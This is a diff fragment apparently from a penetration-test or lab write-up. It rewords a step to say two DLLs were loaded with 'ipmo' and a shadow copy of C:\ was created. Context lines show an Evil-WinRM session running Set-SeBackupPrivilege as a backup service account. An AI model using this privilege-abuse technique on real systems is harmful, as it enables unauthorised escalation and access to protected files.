@@ -403,7 +403,7 @@ Mode                LastWriteTime         Length Name
 -a----        7/17/2024   2:31 PM          16384 SeBackupPrivilegeUtils.dll
 ```
 
-Created a shadow copy of the disk.
+Loaded the two DLLs with `ipmo` and created a shadow copy of C:\\.
 
 ```
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> Set-SeBackupPrivilege
